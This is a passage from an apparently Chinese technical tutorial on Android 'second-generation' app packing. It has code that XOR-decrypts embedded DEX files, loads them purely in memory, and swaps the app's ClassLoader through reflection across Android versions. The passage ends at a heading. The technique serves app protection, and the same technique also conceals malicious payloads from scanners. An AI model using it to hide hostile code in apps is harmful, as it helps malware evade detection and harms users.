        data[i] ^= (<span class="hljs-type">byte</span>) <span class="hljs-number">0xFF</span>;  <span class="hljs-comment">// 每字节与0xFF异或</span>
    }
    <span class="hljs-keyword">return</span> data;
}
</code></pre>
<h4 data-id="heading-22">解析流程图解</h4>
<pre><code class="hljs language-ini" lang="ini">壳DEX数据 (shellDexData):
┌───────────────────────────────────────────────────────────────────────┐
│     壳代码区域        │       加密DEX集合区域       │  4字节集合大小   │
│  (ProxyApplication)  │                            │   (小端序)       │
└───────────────────────────────────────────────────────────────────────┘
                       ↑                            ↑                  ↑
                       │                            │                  │
              shellDexLength-4-sourceDexsSizeInt    │          shellDexLength-4
                       │                            │
                       │←────── sourceDexsSizeInt ────→│

解密后的DEX集合 (sourceDexsData):
┌─────────┬───────────┬─────────┬───────────┬─────────┬───────────┐
│ DEX1大小│  DEX1数据  │ DEX2大小│  DEX2数据  │ DEX3大小│  DEX3数据  │
│ (4字节) │           │ (4字节) │           │ (4字节) │           │
└─────────┴───────────┴─────────┴───────────┴─────────┴───────────┘
    ↓           ↓           ↓           ↓           ↓           ↓
    └───────────┘           └───────────┘           └───────────┘
         ↓                       ↓                       ↓
   ByteBuffer<span class="hljs-section">[0]</span>           ByteBuffer<span class="hljs-section">[1]</span>           ByteBuffer<span class="hljs-section">[2]</span>
         ↓                       ↓                       ↓
         └───────────────────────┴───────────────────────┘
                                 ↓
                    InMemoryDexClassLoader加载
                         （内存加载，不落地）
</code></pre>
<h4 data-id="heading-23">2.3 ClassLoader替换与版本兼容（与一代核心区别）</h4>
<blockquote>
<p><strong>与一代的区别</strong>：一代使用<code>DexClassLoader(filePath)</code>，二代使用<code>InMemoryDexClassLoader(ByteBuffer[])</code>，需要处理多版本API差异。</p>
</blockquote>
<h5 data-id="heading-24">ClassLoader替换核心逻辑</h5>
<p>与一代加固类似，二代加固也需要替换系统的ClassLoader。但二代加固使用的是<code>InMemoryDexClassLoader</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 替换壳App的ClassLoader为源App的ClassLoader
 * 
 * 核心流程：
 * 1. 获取当前ClassLoader
 * 2. 反射获取ActivityThread和LoadedApk
 * 3. 使用CompatInMemoryDexClassLoader创建新ClassLoader
 * 4. 替换LoadedApk中的mClassLoader字段
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">replaceClassLoader</span><span class="hljs-params">(ByteBuffer[] byteBuffers)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 1. 检查Android版本支持（需要API 21+）</span>
        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.LOLLIPOP) {
            log(<span class="hljs-string">"✗ Android version "</span> + Build.VERSION.SDK_INT + <span class="hljs-string">" not supported"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-comment">// 2. 获取当前ClassLoader</span>
        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClassLoader();
        log(<span class="hljs-string">"Current ClassLoader: "</span> + classLoader.toString());
        
        <span class="hljs-comment">// 3. 反射获取ActivityThread</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">activityThread</span> <span class="hljs-operator">=</span> Reflection.getStaticField(
            <span class="hljs-string">"android.app.ActivityThread"</span>, <span class="hljs-string">"sCurrentActivityThread"</span>);
        
        <span class="hljs-comment">// 4. 反射获取LoadedApk</span>
        <span class="hljs-type">ArrayMap</span> <span class="hljs-variable">mPackages</span> <span class="hljs-operator">=</span> (ArrayMap) Reflection.getField(
            <span class="hljs-string">"android.app.ActivityThread"</span>, activityThread, <span class="hljs-string">"mPackages"</span>);
        <span class="hljs-type">WeakReference</span> <span class="hljs-variable">weakReference</span> <span class="hljs-operator">=</span> (WeakReference) mPackages.get(getPackageName());
        <span class="hljs-type">Object</span> <span class="hljs-variable">loadedApk</span> <span class="hljs-operator">=</span> weakReference.get();
        
        <span class="hljs-comment">// 5. 使用工厂方法创建ClassLoader（自动选择最佳实现）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">libPath</span> <span class="hljs-operator">=</span> getApplicationInfo().nativeLibraryDir;
        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">dexClassLoader</span> <span class="hljs-operator">=</span> CompatInMemoryDexClassLoader.create(
            byteBuffers,      <span class="hljs-comment">// DEX数据</span>
            <span class="hljs-built_in">this</span>,             <span class="hljs-comment">// Context</span>
            libPath,          <span class="hljs-comment">// Native库路径</span>
            classLoader.getParent()  <span class="hljs-comment">// 父ClassLoader</span>
        );
        
        <span class="hljs-comment">// 6. 替换LoadedApk中的mClassLoader</span>
        Reflection.setField(<span class="hljs-string">"android.app.LoadedApk"</span>, <span class="hljs-string">"mClassLoader"</span>, 
                           loadedApk, dexClassLoader);
        
        <span class="hljs-comment">// 7. Android 10以下需要手动注入Native库路径</span>
        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.Q) {
            installNativeLibraryPath(dexClassLoader);
        }
        
        log(<span class="hljs-string">"Successfully replaced ClassLoader"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        
    } <span class="hljs-keyword">catch</span> (Exception e) {
        log(<span class="hljs-string">"Error: "</span> + Log.getStackTraceString(e));
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<h4 data-id="heading-25">版本兼容性工厂方法（核心亮点）</h4>
<p><code>CompatInMemoryDexClassLoader.create()</code>是二代加固的核心创新，它根据Android版本自动选择最佳加载方案：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * CompatInMemoryDexClassLoader.java - 兼容性ClassLoader工厂
 * 
 * 支持Android 5.0+ (API 21+)的内存DEX加载
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompatInMemoryDexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseDexClassLoader</span> {

    <span class="hljs-comment">/**
     * 静态工厂方法：根据Android版本自动选择最佳实现
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ClassLoader <span class="hljs-title function_">create</span><span class="hljs-params">(ByteBuffer[] dexBuffers, Context context,
                                     String libraryPath, ClassLoader parent)</span> {
        Log.d(TAG, <span class="hljs-string">"Creating ClassLoader for SDK "</span> + Build.VERSION.SDK_INT);
        
        <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.Q) {
            <span class="hljs-comment">// ==================== Android 10+ (API 29+) ====================</span>
            <span class="hljs-comment">// 完整支持：InMemoryDexClassLoader(ByteBuffer[], libraryPath, parent)</span>
            Log.d(TAG, <span class="hljs-string">"Using InMemoryDexClassLoader with libraryPath"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDexClassLoader</span>(dexBuffers, libraryPath, parent);
            
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O_MR1) {
            <span class="hljs-comment">// ==================== Android 8.1-9 (API 27-28) ====================</span>
            <span class="hljs-comment">// 部分支持：InMemoryDexClassLoader(ByteBuffer[], parent)</span>
            <span class="hljs-comment">// 不支持libraryPath，需要后续手动注入</span>
            Log.d(TAG, <span class="hljs-string">"Using InMemoryDexClassLoader without libraryPath"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDexClassLoader</span>(dexBuffers, parent);
            
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) {
            <span class="hljs-comment">// ==================== Android 8.0 (API 26) ====================</span>
            <span class="hljs-comment">// 有限支持：仅支持单个ByteBuffer</span>
            <span class="hljs-keyword">if</span> (dexBuffers.length == <span class="hljs-number">1</span>) {
                Log.d(TAG, <span class="hljs-string">"Using single InMemoryDexClassLoader"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDexClassLoader</span>(dexBuffers[<span class="hljs-number">0</span>], parent);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 多DEX：使用反射注入方案</span>
                Log.d(TAG, <span class="hljs-string">"Using CompatInMemoryDexClassLoader for multi-dex"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompatInMemoryDexClassLoader</span>(dexBuffers, context, parent);
            }
            
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) {
            <span class="hljs-comment">// ==================== Android 5.0-7.1 (API 21-25) ====================</span>
            <span class="hljs-comment">// 无原生支持：使用兼容实现</span>
            Log.d(TAG, <span class="hljs-string">"Using CompatInMemoryDexClassLoader (5.0-7.1)"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompatInMemoryDexClassLoader</span>(dexBuffers, context, parent);
            
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Android version not supported"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-26">版本兼容性详解图</h4>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────────────────────────┐
│                      InMemoryDexClassLoader 版本支持                             │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  ✅ Android <span class="hljs-number">10</span>+ (API <span class="hljs-number">29</span>+)                                                       │
│  ───────────────────────────────────────────────────────────────────────────    │
│  构造函数: <span class="hljs-built_in">InMemoryDexClassLoader</span>(ByteBuffer[], libraryPath, parent)            │
│                                                                                 │
│  • 完整支持多DEX                                                                 │
│  • 完整支持Native库路径                                                          │
│  • 纯内存加载，不落地                                                            │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  ⚠️ Android <span class="hljs-number">8.1</span>-<span class="hljs-number">9</span> (API <span class="hljs-number">27</span>-<span class="hljs-number">28</span>)                                                   │
│  ───────────────────────────────────────────────────────────────────────────    │
│  构造函数: <span class="hljs-built_in">InMemoryDexClassLoader</span>(ByteBuffer[], parent)                         │
│                                                                                 │
│  • 支持多DEX                                                                     │
│  • 不支持libraryPath参数                                                         │
│  • 需要使用RetroLoadLibrary手动注入Native库路径                                   │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  ⚠️ Android <span class="hljs-number">8.0</span> (API <span class="hljs-number">26</span>)                                                        │
│  ───────────────────────────────────────────────────────────────────────────    │
│  构造函数: <span class="hljs-built_in">InMemoryDexClassLoader</span>(ByteBuffer, parent)                           │
│                                                                                 │
│  • 仅支持单个ByteBuffer                                                          │
│  • 多DEX需要多次使用InMemoryDexClassLoader加载dexFile后                          │
│    反射注入到 BaseDexClassLoader.pathList.dexElements                           │
│  • 不支持libraryPath                                                            │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  🔨 Android <span class="hljs-number">5.0</span>-<span class="hljs-number">7.1</span> (API <span class="hljs-number">21</span>-<span class="hljs-number">25</span>)                                                 │
│  ───────────────────────────────────────────────────────────────────────────    │
│  构造函数: CompatInMemoryDexClassLoader（自定义实现）                             │
│                                                                                 │
│  • InMemoryDexClassLoader 不存在                                                 │
│  • 通过反射将DEX数据注入到BaseDexClassLoader.pathList.dexElements                │
│  • 优先尝试内存加载出dex的方法，失败则回退到临时文件方案                            │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│  ❌ Android <span class="hljs-number">4</span>.x (API &lt; <span class="hljs-number">21</span>)                                                      │
│  ───────────────────────────────────────────────────────────────────────────    │
│  示例Demo未做支持二代加固                                                         │
└─────────────────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-27">2.4 Android 5.0-7.1 兼容实现（CompatInMemoryDexClassLoader）</h4>
<blockquote>
<p><strong>与一代的区别</strong>：一代无需此兼容逻辑。二代由于使用内存加载，必须在无<code>InMemoryDexClassLoader</code>的旧版本上手动实现DEX到<code>dexElements</code>的注入。</p>
</blockquote>
<h5 data-id="heading-28">核心挑战</h5>
<p>Android 5.0-7.1没有<code>InMemoryDexClassLoader</code>，必须通过反射实现内存加载：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * CompatInMemoryDexClassLoader - 兼容Android 5.0-7.1的内存DEX加载器
 *
 * 核心原理：
 * 1. 创建空的BaseDexClassLoader
 * 2. 通过反射获取其内部的DexPathList.dexElements数组
 * 3. 将内存中的DEX数据转换为DexElement对象
 * 4. 将新的DexElement注入到dexElements数组中
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompatInMemoryDexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseDexClassLoader</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Context mContext;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;File&gt; mTempFiles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CompatInMemoryDexClassLoader</span><span class="hljs-params">(ByteBuffer[] dexBuffers,
                                        Context context,
                                        ClassLoader parent)</span> {
        <span class="hljs-built_in">super</span>(<span class="hljs-string">""</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, parent);  <span class="hljs-comment">// 空路径初始化</span>
        <span class="hljs-built_in">this</span>.mContext = context;
        loadDexBuffers(dexBuffers);     <span class="hljs-comment">// 手动加载DEX</span>
    }

    <span class="hljs-comment">/**
     * 加载多个DEX字节数据
     *
     * 关键步骤：
     * 1. 反射获取pathList字段
     * 2. 反射获取dexElements数组
     * 3. 为每个DEX创建Element对象
     * 4. 合并新旧Element并设置回去
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadDexBuffers</span><span class="hljs-params">(ByteBuffer[] dexBuffers)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 获取pathList字段</span>
            <span class="hljs-type">Field</span> <span class="hljs-variable">pathListField</span> <span class="hljs-operator">=</span> BaseDexClassLoader.class
                    .getDeclaredField(<span class="hljs-string">"pathList"</span>);
            pathListField.setAccessible(<span class="hljs-literal">true</span>);
            <span class="hljs-type">Object</span> <span class="hljs-variable">pathList</span> <span class="hljs-operator">=</span> pathListField.get(<span class="hljs-built_in">this</span>);

            <span class="hljs-comment">// 2. 获取dexElements数组</span>
            <span class="hljs-type">Field</span> <span class="hljs-variable">dexElementsField</span> <span class="hljs-operator">=</span> pathList.getClass()
                    .getDeclaredField(<span class="hljs-string">"dexElements"</span>);
            dexElementsField.setAccessible(<span class="hljs-literal">true</span>);
            Object[] existingElements = (Object[]) dexElementsField.get(pathList);

            <span class="hljs-comment">// 3. 为每个DEX创建Element</span>
            List&lt;Object&gt; newElementsList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; dexBuffers.length; i++) {
                <span class="hljs-type">byte</span>[] dexBytes = bufferToBytes(dexBuffers[i]);

                <span class="hljs-comment">// 验证DEX魔数</span>
                <span class="hljs-keyword">if</span> (!validateDex(dexBytes)) {
                    log(<span class="hljs-string">"Invalid dex at index "</span> + i);
                    <span class="hljs-keyword">continue</span>;
                }

                <span class="hljs-type">Object</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> createDexElement(dexBytes, i);
                <span class="hljs-keyword">if</span> (element != <span class="hljs-literal">null</span>) {
                    newElementsList.add(element);
                }
            }

            <span class="hljs-comment">// 4. 合并Elements（新的放前面，优先级更高）</span>
            Object[] newElements = mergeElements(existingElements,
                    newElementsList.toArray());

            <span class="hljs-comment">// 5. 设置回pathList</span>
            dexElementsField.set(pathList, newElements);

            log(<span class="hljs-string">"Successfully loaded "</span> + newElementsList.size() + <span class="hljs-string">" dex files"</span>);

        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to load dex from memory"</span>, e);
        }
    }
}
</code></pre>
<h4 data-id="heading-29">ClassLoader内部结构</h4>
<p>要理解为什么需要反射注入，必须了解<code>BaseDexClassLoader</code>的内部结构：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram
    direction TB
    
    class ClassLoader {
        &lt;&lt;abstract&gt;&gt;
        #ClassLoader parent
        +loadClass(String name) Class~?~
        +findClass(String name) Class~?~
        #findLoadedClass(String name) Class~?~
    }
    
    class BaseDexClassLoader {
        -DexPathList pathList
        +BaseDexClassLoader(String dexPath, File optimizedDir, String libraryPath, ClassLoader parent)
        +findClass(String name) Class~?~
        +findLibrary(String name) String
        #findResource(String name) URL
    }
    
    class DexPathList {
        -Element[] dexElements ⚡注入目标
        -List~File~ nativeLibraryDirectories
        -List~File~ systemNativeLibraryDirectories
        -NativeLibraryElement[] nativeLibraryPathElements
        +findClass(String name, List~Throwable~ suppressed) Class~?~
        +findLibrary(String libraryName) String
        -makePathElements(List~File~ files) Element[]
    }
    
    class Element {
        &lt;&lt;DexPathList.Element&gt;&gt;
        -DexFile dexFile 📦DEX字节码
        -File path 📂文件路径(可为null)
        +findClass(String name, ClassLoader definingContext, List~Throwable~ suppressed) Class~?~
    }
    
    class DexFile {
        &lt;&lt;dalvik.system&gt;&gt;
        -long mCookie
        -String mFileName
        +loadClass(String name, ClassLoader loader) Class~?~
        +entries() Enumeration~String~
        +close() void
    }
    
    class NativeLibraryElement {
        &lt;&lt;DexPathList.NativeLibraryElement&gt;&gt;
        -File path
        +findNativeLibrary(String name) String
    }

    ClassLoader &lt;|-- BaseDexClassLoader : extends
    BaseDexClassLoader *-- DexPathList : contains
    DexPathList *-- "1..*" Element : dexElements
    DexPathList *-- "0..*" NativeLibraryElement : nativeLibraryPathElements
    Element *-- DexFile : contains
    
    note for DexPathList "🎯 反射注入的核心目标\n通过修改dexElements数组\n实现内存DEX加载"
    note for Element "💡 每个Element对应一个DEX\n内存加载时path可为null"
</code></pre>
<h4 data-id="heading-30">DexElement创建策略</h4>
<p>创建<code>DexPathList.Element</code>对象是最复杂的部分，因为不同Android版本的构造函数参数不同：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 创建DexElement对象
 *
 * 策略：
 * 1. Android 8.0+：从InMemoryDexClassLoader提取
 * 2. Android 5.0-7.1：优先内存方法，失败则临时文件
 */</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createDexElement</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes, <span class="hljs-type">int</span> index)</span> <span class="hljs-keyword">throws</span> Exception {

    <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) {
        <span class="hljs-comment">// ==================== Android 8.0+ ====================</span>
        <span class="hljs-comment">// 借用InMemoryDexClassLoader来创建DexElement</span>
        <span class="hljs-keyword">return</span> createDexElementForAndroid8(dexBytes, index);

    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) {
        <span class="hljs-comment">// ==================== Android 5.0-7.1 ====================</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 优先尝试内存加载方案</span>
            <span class="hljs-keyword">return</span> createDexElementInMemory(dexBytes, index);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 回退到临时文件方案</span>
            <span class="hljs-keyword">return</span> createDexElementViaFile(dexBytes, index);
        }
    }

    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Unsupported Android version"</span>);
}

<span class="hljs-comment">/**
 * Android 8.0+ 方案：从InMemoryDexClassLoader提取Element
 */</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createDexElementForAndroid8</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes, <span class="hljs-type">int</span> index)</span>
        <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// 1. 创建临时InMemoryDexClassLoader</span>
    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.wrap(dexBytes);
    <span class="hljs-type">InMemoryDexClassLoader</span> <span class="hljs-variable">tempLoader</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDexClassLoader</span>(buffer, getClass().getClassLoader());

    <span class="hljs-comment">// 2. 反射获取其pathList</span>
    <span class="hljs-type">Field</span> <span class="hljs-variable">pathListField</span> <span class="hljs-operator">=</span> BaseDexClassLoader.class.getDeclaredField(<span class="hljs-string">"pathList"</span>);
    pathListField.setAccessible(<span class="hljs-literal">true</span>);
    <span class="hljs-type">Object</span> <span class="hljs-variable">tempPathList</span> <span class="hljs-operator">=</span> pathListField.get(tempLoader);

    <span class="hljs-comment">// 3. 反射获取dexElements</span>
    <span class="hljs-type">Field</span> <span class="hljs-variable">dexElementsField</span> <span class="hljs-operator">=</span> tempPathList.getClass().getDeclaredField(<span class="hljs-string">"dexElements"</span>);
    dexElementsField.setAccessible(<span class="hljs-literal">true</span>);
    Object[] tempElements = (Object[]) dexElementsField.get(tempPathList);

    <span class="hljs-comment">// 4. 返回提取的Element</span>
    <span class="hljs-keyword">return</span> tempElements[<span class="hljs-number">0</span>];
}

<span class="hljs-comment">/**
 * Android 5.0-7.1 内存加载方案（多种尝试）
 */</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createDexElementInMemory</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes, <span class="hljs-type">int</span> index)</span>
        <span class="hljs-keyword">throws</span> Exception {

    Class&lt;?&gt; dexFileClass = Class.forName(<span class="hljs-string">"dalvik.system.DexFile"</span>);
    <span class="hljs-type">File</span> <span class="hljs-variable">optimizedDir</span> <span class="hljs-operator">=</span> getOptimizedDexDir();
    <span class="hljs-type">String</span> <span class="hljs-variable">optimizedPath</span> <span class="hljs-operator">=</span> optimizedDir + <span class="hljs-string">"/memory_dex_"</span> + index + <span class="hljs-string">".odex"</span>;

    <span class="hljs-comment">// ========== 方法1: loadDex(byte[], String, int) ==========</span>
    <span class="hljs-comment">// 部分定制ROM支持此方法</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">Method</span> <span class="hljs-variable">loadDexMethod</span> <span class="hljs-operator">=</span> dexFileClass.getDeclaredMethod(
                <span class="hljs-string">"loadDex"</span>, <span class="hljs-type">byte</span>[].class, String.class, <span class="hljs-type">int</span>.class);
        loadDexMethod.setAccessible(<span class="hljs-literal">true</span>);

        <span class="hljs-type">DexFile</span> <span class="hljs-variable">dexFile</span> <span class="hljs-operator">=</span> (DexFile) loadDexMethod.invoke(
                <span class="hljs-literal">null</span>, dexBytes, optimizedPath, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">if</span> (dexFile != <span class="hljs-literal">null</span>) {
            log(<span class="hljs-string">"loadDex(byte[]) succeeded"</span>);
            <span class="hljs-keyword">return</span> createElementObject(dexFile, <span class="hljs-literal">null</span>);
        }
    } <span class="hljs-keyword">catch</span> (NoSuchMethodException e) {
        <span class="hljs-comment">// 方法不存在，尝试下一个</span>
    }

    <span class="hljs-comment">// ========== 方法2: openInMemoryDexFile ==========</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">Method</span> <span class="hljs-variable">openMethod</span> <span class="hljs-operator">=</span> dexFileClass.getDeclaredMethod(
                <span class="hljs-string">"openInMemoryDexFile"</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);
        openMethod.setAccessible(<span class="hljs-literal">true</span>);

        <span class="hljs-type">DexFile</span> <span class="hljs-variable">dexFile</span> <span class="hljs-operator">=</span> (DexFile) openMethod.invoke(
                <span class="hljs-literal">null</span>, dexBytes, <span class="hljs-number">0</span>, dexBytes.length);
        <span class="hljs-keyword">if</span> (dexFile != <span class="hljs-literal">null</span>) {
            log(<span class="hljs-string">"openInMemoryDexFile succeeded"</span>);
            <span class="hljs-keyword">return</span> createElementObject(dexFile, <span class="hljs-literal">null</span>);
        }
    } <span class="hljs-keyword">catch</span> (NoSuchMethodException e) {
        <span class="hljs-comment">// 方法不存在，尝试下一个</span>
    }

    <span class="hljs-comment">// ========== 方法3: DexFile(byte[]) 构造函数 ==========</span>
    <span class="hljs-keyword">try</span> {
        Constructor&lt;?&gt; constructor = dexFileClass.getDeclaredConstructor(<span class="hljs-type">byte</span>[].class);
        constructor.setAccessible(<span class="hljs-literal">true</span>);

        <span class="hljs-type">DexFile</span> <span class="hljs-variable">dexFile</span> <span class="hljs-operator">=</span> (DexFile) constructor.newInstance((Object) dexBytes);
        log(<span class="hljs-string">"DexFile(byte[]) succeeded"</span>);
        <span class="hljs-keyword">return</span> createElementObject(dexFile, <span class="hljs-literal">null</span>);
    } <span class="hljs-keyword">catch</span> (NoSuchMethodException e) {
        <span class="hljs-comment">// 构造函数不存在</span>
    }

    <span class="hljs-comment">// 所有内存方法都失败</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"No in-memory loading method available"</span>);
}
</code></pre>
<h4 data-id="heading-31">Element构造函数版本差异</h4>
<p>不同Android版本的<code>DexPathList.Element</code>构造函数参数完全不同：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 创建DexPathList.Element对象
 *
 * 不同版本构造函数差异：
 * - Android 8.0+ (API 26+): Element(DexFile)
 * - Android 7.0-7.1 (API 24-25): Element(File, boolean, File, DexFile)
 * - Android 6.0 (API 23): Element(File, boolean, File, DexFile)
 * - Android 5.0-5.1 (API 21-22): Element(File, boolean, File, DexFile)
 */</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createElementObject</span><span class="hljs-params">(DexFile dexFile, File dexPath)</span> <span class="hljs-keyword">throws</span> Exception {
    Class&lt;?&gt; elementClass = Class.forName(<span class="hljs-string">"dalvik.system.DexPathList$Element"</span>);

    <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) {
        <span class="hljs-comment">// ==================== Android 8.0+ ====================</span>
        <span class="hljs-comment">// 构造函数：Element(DexFile dexFile)</span>
        Constructor&lt;?&gt; constructor = elementClass.getDeclaredConstructor(DexFile.class);
        constructor.setAccessible(<span class="hljs-literal">true</span>);
        <span class="hljs-keyword">return</span> constructor.newInstance(dexFile);

    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// ==================== Android 5.0-7.1 ====================</span>
        <span class="hljs-comment">// 构造函数：Element(File path, boolean isDirectory, File zip, DexFile dexFile)</span>
        <span class="hljs-keyword">try</span> {
            Constructor&lt;?&gt; constructor = elementClass.getDeclaredConstructor(
                    File.class, <span class="hljs-type">boolean</span>.class, File.class, DexFile.class);
            constructor.setAccessible(<span class="hljs-literal">true</span>);
            <span class="hljs-keyword">return</span> constructor.newInstance(dexPath, <span class="hljs-literal">false</span>, dexPath, dexFile);
        } <span class="hljs-keyword">catch</span> (NoSuchMethodException e) {
            <span class="hljs-comment">// 回退：遍历所有构造函数尝试匹配</span>
            <span class="hljs-keyword">return</span> createElementFallback(elementClass, dexFile, dexPath);
        }
    }
}

<span class="hljs-comment">/**
 * 备用方案：遍历所有构造函数尝试匹配
 */</span>
<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createElementFallback</span><span class="hljs-params">(Class&lt;?&gt; elementClass,
                                     DexFile dexFile, File dexPath)</span> <span class="hljs-keyword">throws</span> Exception {
    Constructor&lt;?&gt;[] constructors = elementClass.getDeclaredConstructors();

    <span class="hljs-keyword">for</span> (Constructor&lt;?&gt; constructor : constructors) {
        Class&lt;?&gt;[] paramTypes = constructor.getParameterTypes();
        constructor.setAccessible(<span class="hljs-literal">true</span>);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (paramTypes.length == <span class="hljs-number">1</span> &amp;&amp; paramTypes[<span class="hljs-number">0</span>] == DexFile.class) {
                <span class="hljs-comment">// Element(DexFile)</span>
                <span class="hljs-keyword">return</span> constructor.newInstance(dexFile);

            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (paramTypes.length == <span class="hljs-number">4</span>) {
                <span class="hljs-comment">// Element(File, boolean, File, DexFile)</span>
                <span class="hljs-keyword">return</span> constructor.newInstance(dexPath, <span class="hljs-literal">false</span>, dexPath, dexFile);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">continue</span>;
        }
    }

    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"No suitable Element constructor found"</span>);
}
</code></pre>
<h4 data-id="heading-32">临时文件回退方案</h4>
